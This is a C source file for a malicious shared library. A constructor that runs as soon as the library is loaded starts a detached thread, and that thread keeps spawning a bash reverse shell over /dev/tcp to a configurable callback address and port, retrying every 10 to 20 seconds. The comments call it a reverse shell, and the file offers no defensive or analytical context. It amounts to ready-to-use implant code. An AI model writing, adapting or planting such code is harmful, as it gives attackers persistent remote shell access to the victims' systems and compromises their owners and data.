#include <pthread.h>
#include <stdlib.h>
#include <unistd.h>

#define SLEEP  10        // Time to sleep between callbacks
#define CBADDR "0.0.0.0" // Callback address
#define CBPORT "5555"    // Callback port

//Reverse shell command
#define CMD "echo 'exec >&/dev/tcp/" CBADDR "/" CBPORT "; exec 0>&1' | /bin/bash"

void* callback(void* a);

__attribute__((constructor)) //This function is called when library is loaded
void start_callbacks(){
  pthread_t tid;
  pthread_attr_t attr;

  // Start thread detached
  if (-1 == pthread_attr_init(&attr)) {
    return;
  }
  if (-1 == pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED)) {
    return;
  }

  //Spawn a thread to do the real work
  pthread_create(&tid, &attr, callback, NULL);
}

/* callback tries to spawn a reverse shell every so often.  */
void* callback(void* a)
{
  int ret;
  for (;;) {
    //Try to spawn a reverse shell
    ret = system(CMD);

    //Wait until next shell
    if (ret != 0)
      sleep(SLEEP*2);
    else
      sleep(SLEEP);
  }
  return NULL;
}
